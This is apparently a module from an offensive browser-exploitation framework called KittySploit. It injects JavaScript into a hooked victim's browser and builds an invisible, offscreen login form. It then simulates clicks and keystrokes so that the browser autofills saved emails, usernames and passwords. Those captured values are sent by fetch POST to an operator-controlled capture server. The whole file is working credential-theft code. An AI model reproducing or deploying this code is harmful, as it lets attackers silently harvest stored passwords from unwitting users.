from kittysploit import *

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Hidden Form Capture",
		"description": "Create a hidden form to trigger browser autofill and capture saved credentials (email/username/password)",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}	
	
	form_size = OptString("tiny", "Form size: 'tiny' (1x1px), 'small' (minimal visible), 'normal' (small but visible)", False)
	wait_time = OptInteger(3, "Time to wait for autofill to trigger (seconds)", False)
	server_url = OptString("", "Server URL to send captured data (empty = auto-detect from browser server)", False)

	def run(self):
		"""Create form to trigger autofill and capture saved credentials"""
		
		# Get current page URL
		current_url = self.send_js_and_wait_for_response("window.location.href", timeout=3.0)
		if not current_url:
			current_url = "about:blank"
		
		# Determine server URL for sending captured data
		if self.server_url:
			server_url = self.server_url
		else:
			# Try to detect from browser server if available
			if hasattr(self, 'browser_server') and self.browser_server:
				server_host = self.browser_server.host if hasattr(self.browser_server, 'host') else '127.0.0.1'
				server_port = self.browser_server.port if hasattr(self.browser_server, 'port') else 8080
				# Replace 0.0.0.0 with 127.0.0.1 for HTTP requests
				if server_host == '0.0.0.0':
					server_host = '127.0.0.1'
				server_url = f"http://{server_host}:{server_port}"
			else:
				# Extract from current URL or use default
				try:
					from urllib.parse import urlparse
					parsed = urlparse(current_url)
					if parsed.hostname:
						# Replace 0.0.0.0 with 127.0.0.1
						hostname = parsed.hostname
						if hostname == '0.0.0.0':
							hostname = '127.0.0.1'
						port = parsed.port or (443 if parsed.scheme == 'https' else 80)
						server_url = f"{parsed.scheme}://{hostname}:{port}"
					else:
						server_url = "http://127.0.0.1:8080"
				except:
					server_url = "http://127.0.0.1:8080"
		
		# Determine form size styles
		if self.form_size == "tiny":
			form_style = "position:absolute; left:-9999px; top:-9999px; width:1px; height:1px; overflow:hidden; opacity:0.01;"
			field_style = "width:1px; height:1px; padding:0; margin:0; border:0; font-size:1px;"
		elif self.form_size == "small":
			form_style = "position:absolute; left:10px; top:10px; width:2px; height:2px; opacity:0.01; z-index:999999;"
			field_style = "width:2px; height:2px; padding:0; margin:0; border:0; font-size:1px;"
		else:  # normal
			form_style = "position:absolute; left:10px; top:10px; width:200px; height:60px; opacity:0.1; z-index:999999; background:rgba(255,255,255,0.1);"
			field_style = "width:180px; height:20px; padding:2px; margin:2px; border:1px solid rgba(0,0,0,0.1); font-size:12px;"
		
		js_code = f"""
		(function() {{
			// Remove existing form if present
			const existingForm = document.getElementById('ksAutofillForm');
			if (existingForm) {{
				existingForm.remove();
			}}
			
			// Create form container
			const formContainer = document.createElement('div');
			formContainer.id = 'ksAutofillForm';
			formContainer.style.cssText = '{form_style}';
			
			// Create form with proper attributes to trigger autofill
			const autofillForm = document.createElement('form');
			autofillForm.id = 'ksAutofillFormElement';
			autofillForm.method = 'POST';
			autofillForm.action = window.location.href;
			autofillForm.autocomplete = 'on';
			
			// Create email field (triggers autofill for email)
			const emailField = document.createElement('input');
			emailField.type = 'email';
			emailField.name = 'email';
			emailField.id = 'ksAutofillEmail';
			emailField.autocomplete = 'email';
			emailField.placeholder = 'Email';
			emailField.style.cssText = '{field_style}';
			autofillForm.appendChild(emailField);
			
			// Create username field (alternative to email)
			const usernameField = document.createElement('input');
			usernameField.type = 'text';
			usernameField.name = 'username';
			usernameField.id = 'ksAutofillUsername';
			usernameField.autocomplete = 'username';
			usernameField.placeholder = 'Username';
			usernameField.style.cssText = '{field_style}';
			autofillForm.appendChild(usernameField);
			
			// Create password field (triggers autofill for password)
			const passwordField = document.createElement('input');
			passwordField.type = 'password';
			passwordField.name = 'password';
			passwordField.id = 'ksAutofillPassword';
			passwordField.autocomplete = 'current-password';
			passwordField.placeholder = 'Password';
			passwordField.style.cssText = '{field_style}';
			autofillForm.appendChild(passwordField);
			
			// Create submit button (helps trigger autofill)
			const submitButton = document.createElement('button');
			submitButton.type = 'submit';
			submitButton.id = 'ksAutofillSubmit';
			submitButton.style.cssText = '{field_style}';
			submitButton.textContent = 'Login';
			autofillForm.appendChild(submitButton);
			
			formContainer.appendChild(autofillForm);
			document.body.appendChild(formContainer);
			
			// Store captured data
			window.ksAutofillData = window.ksAutofillData || {{ captured: false, data: null }};
			
			// Function to send captured data to server
			function sendCapturedData(data) {{
				const payload = {{
					timestamp: new Date().toISOString(),
					url: window.location.href,
					title: document.title,
					source: 'autofill',
					data: data
				}};
				
				// Try to send via fetch
				fetch('{server_url}/api/capture', {{
					method: 'POST',
					headers: {{
						'Content-Type': 'application/json'
					}},
					body: JSON.stringify(payload)
				}}).then(response => {{
					console.log('[Autofill Capture] Data sent to server:', response.status);
				}}).catch(error => {{
					console.warn('[Autofill Capture] Failed to send data:', error);
					// Store locally as fallback
					window.ksAutofillData.data = payload;
				}});
			}}
			
			// Function to extract form data
			function extractFormData() {{
				const formData = {{
					email: emailField.value || '',
					username: usernameField.value || '',
					password: passwordField.value || ''
				}};
				return formData;
			}}
			
			// Function to check and capture autofill data
			function checkAutofill() {{
				const formData = extractFormData();
				const hasData = formData.email || formData.username || formData.password;
				
				if (hasData && !window.ksAutofillData.captured) {{
					window.ksAutofillData.captured = true;
					window.ksAutofillData.data = formData;
					
					console.log('[Autofill Capture] ✅ Autofill detected!');
					console.log('[Autofill Capture] Email:', formData.email || '(empty)');
					console.log('[Autofill Capture] Username:', formData.username || '(empty)');
					console.log('[Autofill Capture] Password:', formData.password ? '*'.repeat(formData.password.length) : '(empty)');
					
					// Send to server
					sendCapturedData(formData);
				}}
			}}
			
			// Monitor input events to detect autofill
			emailField.addEventListener('input', checkAutofill);
			usernameField.addEventListener('input', checkAutofill);
			passwordField.addEventListener('input', checkAutofill);
			
			// Monitor autofill events (some browsers fire these)
			emailField.addEventListener('change', checkAutofill);
			usernameField.addEventListener('change', checkAutofill);
			passwordField.addEventListener('change', checkAutofill);
			
			// Function to simulate typing a character (triggers autofill suggestions)
			function simulateTyping(field, char) {{
				// Ensure field is focused and clicked (more realistic)
				field.focus();
				
				// Simulate mouse click first (helps trigger autofill)
				const clickEvent = new MouseEvent('click', {{
					bubbles: true,
					cancelable: true,
					view: window,
					composed: true
				}});
				field.dispatchEvent(clickEvent);
				
				// Small delay to let browser process click
				setTimeout(() => {{
					// Clear field first
					field.value = '';
					
					// Method 1: Use execCommand first (most reliable for autofill)
					try {{
						field.focus();
						document.execCommand('selectAll', false, null);
						document.execCommand('insertText', false, char);
					}} catch(e) {{
						// If execCommand fails, use events
						
						// Create and dispatch events in the correct order (like real typing)
						const keydownEvent = new KeyboardEvent('keydown', {{
							key: char,
							code: 'Key' + char.toUpperCase(),
							keyCode: char.toUpperCase().charCodeAt(0),
							which: char.toUpperCase().charCodeAt(0),
							bubbles: true,
							cancelable: true,
							composed: true,
							isTrusted: false  // We can't set isTrusted, but try anyway
						}});
						
						const keypressEvent = new KeyboardEvent('keypress', {{
							key: char,
							code: 'Key' + char.toUpperCase(),
							keyCode: char.charCodeAt(0),
							which: char.charCodeAt(0),
							bubbles: true,
							cancelable: true,
							composed: true
						}});
						
						// Dispatch keydown first
						field.dispatchEvent(keydownEvent);
						
						// Dispatch keypress
						field.dispatchEvent(keypressEvent);
						
						// Update value
						field.value = char;
						
						// Create input event with proper properties
						const inputEvent = new InputEvent('input', {{
							inputType: 'insertText',
							data: char,
							bubbles: true,
							cancelable: true,
							composed: true
						}});
						
						// Dispatch input event
						field.dispatchEvent(inputEvent);
						
						// Also try beforeinput event (some browsers use this)
						const beforeInputEvent = new InputEvent('beforeinput', {{
							inputType: 'insertText',
							data: char,
							bubbles: true,
							cancelable: true,
							composed: true
						}});
						field.dispatchEvent(beforeInputEvent);
					}}
					
					// Set selection to end (like real typing) - only if supported
					setTimeout(() => {{
						try {{
							// setSelectionRange doesn't work on email/password fields in some browsers
							if (field.type !== 'email' && field.type !== 'password') {{
								field.setSelectionRange(field.value.length, field.value.length);
							}}
						}} catch(e) {{
							// Ignore selection errors
						}}
						// Trigger change event
						field.dispatchEvent(new Event('change', {{ bubbles: true, composed: true }}));
						// Check immediately after typing
						checkAutofill();
					}}, 50);
				}}, 50);
			}}
			
			// Function to trigger autofill with multiple techniques
			function triggerAutofill() {{
				// Technique 1: Focus and type common characters (most effective)
				emailField.focus();
				// Small delay to ensure focus is set
				setTimeout(() => {{
					// Clear field first
					emailField.value = '';
					// Type character to trigger autofill suggestions
					simulateTyping(emailField, 'p');
					
					// Wait a bit and try selecting from dropdown if it appears
					setTimeout(() => {{
						// Try to select first suggestion with ArrowDown + Enter
						const arrowDown = new KeyboardEvent('keydown', {{
							key: 'ArrowDown',
							code: 'ArrowDown',
							keyCode: 40,
							which: 40,
							bubbles: true,
							cancelable: true,
							composed: true
						}});
						emailField.dispatchEvent(arrowDown);
						
						setTimeout(() => {{
							const enter = new KeyboardEvent('keydown', {{
								key: 'Enter',
								code: 'Enter',
								keyCode: 13,
								which: 13,
								bubbles: true,
								cancelable: true,
								composed: true
							}});
							emailField.dispatchEvent(enter);
							setTimeout(checkAutofill, 200);
						}}, 300);
					}}, 500);
					
					setTimeout(() => {{
						// Try username field
						usernameField.focus();
						setTimeout(() => {{
							usernameField.value = '';
							simulateTyping(usernameField, 'a');
						}}, 100);
					}}, 1000);
					
					setTimeout(() => {{
						// Try password field (focus triggers autofill)
						passwordField.focus();
						setTimeout(checkAutofill, 200);
					}}, 1500);
				}}, 200);
				
				// Technique 2: Try Arrow Down to select first suggestion
				setTimeout(() => {{
					emailField.focus();
					const arrowDownEvent = new KeyboardEvent('keydown', {{
						key: 'ArrowDown',
						code: 'ArrowDown',
						keyCode: 40,
						which: 40,
						bubbles: true,
						cancelable: true
					}});
					emailField.dispatchEvent(arrowDownEvent);
					setTimeout(() => {{
						const enterEvent = new KeyboardEvent('keydown', {{
							key: 'Enter',
							code: 'Enter',
							keyCode: 13,
							which: 13,
							bubbles: true,
							cancelable: true
						}});
						emailField.dispatchEvent(enterEvent);
						setTimeout(checkAutofill, 100);
					}}, 100);
				}}, 800);
				
				// Technique 3: Try Tab key to move between fields (triggers autofill)
				setTimeout(() => {{
					emailField.focus();
					const tabEvent = new KeyboardEvent('keydown', {{
						key: 'Tab',
						code: 'Tab',
						keyCode: 9,
						which: 9,
						bubbles: true,
						cancelable: true
					}});
					emailField.dispatchEvent(tabEvent);
					setTimeout(() => {{
						usernameField.dispatchEvent(tabEvent);
						setTimeout(() => {{
							passwordField.dispatchEvent(tabEvent);
							setTimeout(checkAutofill, 100);
						}}, 100);
					}}, 100);
				}}, 1200);
			}}
			
			// Start triggering autofill immediately
			setTimeout(triggerAutofill, 100);
			
			// Periodic check for autofill (more frequent for better performance)
			let checkCount = 0;
			const maxChecks = {self.wait_time * 4}; // Check every 250ms for faster detection
			const checkInterval = setInterval(() => {{
				checkAutofill();
				checkCount++;
				if (checkCount >= maxChecks || window.ksAutofillData.captured) {{
					clearInterval(checkInterval);
					if (!window.ksAutofillData.captured) {{
						console.log('[Autofill Capture] No autofill detected after', {self.wait_time}, 'seconds');
					}}
				}}
			}}, 250);
			
			// Prevent form submission
			autofillForm.addEventListener('submit', function(e) {{
				e.preventDefault();
				checkAutofill();
				return false;
			}});
			
			console.log('[Autofill Capture] Form created to trigger autofill');
			console.log('[Autofill Capture] Waiting for autofill to trigger...');
			console.log('[Autofill Capture] Server URL:', '{server_url}');
			
			// Return form element reference
			return 'Autofill capture form created successfully';
		}})();
		"""
		
		# Inject the autofill capture code
		result = self.send_js(js_code)
		
		if result:
			print_success("Autofill capture form created!")
			print_info(f"Form size: {self.form_size}")
			print_info(f"Waiting time: {self.wait_time} seconds")
			print_info(f"Server URL: {server_url}/api/capture")
			
			# Wait for autofill to trigger
			import time
			print_status(f"Waiting {self.wait_time} seconds for autofill to trigger...")
			time.sleep(self.wait_time)
			
			# Check if data was captured
			check_js = """
			(function() {
				if (window.ksAutofillData && window.ksAutofillData.captured && window.ksAutofillData.data) {
					return JSON.stringify(window.ksAutofillData.data);
				}
				return null;
			})();
			"""
			
			captured_data_json = self.send_js_and_wait_for_response(check_js, timeout=3.0)
			
			if captured_data_json and captured_data_json != 'null':
				try:
					import json
					captured_data = json.loads(captured_data_json)
					print_success("Autofill data captured!")
					print_info("=" * 60)
					if captured_data.get('email'):
						print_success(f"  Email: {captured_data.get('email')}")
					if captured_data.get('username'):
						print_success(f"  Username: {captured_data.get('username')}")
					if captured_data.get('password'):
						print_success(f"  Password: {'*' * len(captured_data.get('password', ''))}")
					print_info("=" * 60)
				except:
					print_warning("Could not parse captured data")
			else:
				print_error("No autofill data detected")
			
			return result
		else:
			print_error("Failed to inject autofill capture code")
			return False

